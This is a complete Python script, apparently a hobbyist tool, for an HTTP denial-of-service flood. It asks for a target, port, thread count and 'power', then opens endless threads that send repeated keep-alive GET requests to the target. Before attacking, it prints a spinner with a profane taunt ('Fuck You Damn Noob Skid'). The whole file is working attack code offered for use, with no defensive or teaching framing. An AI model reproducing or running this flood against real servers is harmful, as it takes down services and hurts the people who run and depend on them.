import sys
import os
import random
import socket
import time
from threading import Thread

os.system('clear')

print("""
                Fast Http Denial Of Service Python3 Script
                Code By : GogoZin
        [Warning][!][Don't][Attack][Any][Gov][Websites][Please]
""")

url = str(input("[root@Target ~]#"))
port = int(input("[root@Port ~]#"))
thr = int(input("[root@Threads ~]#"))
pow = int(input("[root@Power ~]#"))

def http():
        request = "GET / HTTP/1.1\r\nHost: " + url + "\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.82 Safari/537.36\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n"
        tar = (url,port)
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect(tar)
                        s.send(str.encode(request))
                        print("[root@Attack ~]#Sucess Sent Http Requests To  ---> " + str(url) + ":" + str(port))
                        try:
                                for y in range(pow):
                                        s.send(str.encode(request))
                                        print("[root@Attack ~]#Threads Sent Http Requests To ---> " + str(url) + ":" + str(port))
                        except:
                                print("[root@Error ~]#Sockets Error...Server Maybe Down")
                                s.close()
                except:
                        print("[root@Error ~]#System Get Some Wrong...Restart Script Again")
                        sys.exit()

os.system('clear')
print("[-]Fuck You Damn Noob Skid")
time.sleep(0.5)
os.system('clear')
print("[\]Fuck You Damn Noob Skid")
time.sleep(0.5)
os.system('clear')
print("[|]Fuck You Damn Noob Skid")
time.sleep(0.5)
os.system('clear')
print("[/]Fuck You Damn Noob Skid")
time.sleep(0.5)
os.system('clear')
print("[-]Fuck You Damn Noob Skid")
time.sleep(0.5)
os.system('clear')
print("[\]Fuck You Damn Noob Skid")
time.sleep(0.5)
os.system('clear')
print("[|]Fuck You Damn Noob Skid")
time.sleep(0.5)
os.system('clear')
print("[/]Fuck You Damn Noob Skid")
time.sleep(0.5)
os.system('clear')
print("[-]Fuck You Damn Noob Skid")
time.sleep(0.5)
os.system('clear')
print("[\]Fuck You Damn Noob Skid")
time.sleep(0.5)
os.system('clear')
print("[|]Fuck You Damn Noob Skid")
time.sleep(0.5)
os.system('clear')
print("[/]Fuck You Damn Noob Skid")
time.sleep(0.5)
os.system('clear')
print("[-]Fuck You Damn Noob Skid")
time.sleep(0.5)
os.system('clear')
print("[\]Fuck You Damn Noob Skid")
time.sleep(0.5)
os.system('clear')
print("[|]Fuck You Damn Noob Skid")
time.sleep(0.5)
os.system('clear')
print("[/]Fuck You Damn Noob Skid")
time.sleep(0.5)
os.system('clear')
print("[-]Fuck You Damn Noob Skid")
time.sleep(0.5)
os.system('clear')
print("[\]Fuck You Damn Noob Skid")
time.sleep(0.5)
os.system('clear')
print("[|]Fuck You Damn Noob Skid")
time.sleep(0.5)
os.system('clear')
print("[/]Fuck You Damn Noob Skid")
time.sleep(0.5)
os.system('clear')
print("[-]Fuck You Damn Noob Skid")
time.sleep(1)
os.system('clear')
for i in range(thr):
        i = Thread(target=http, name=(i))
        i.start()
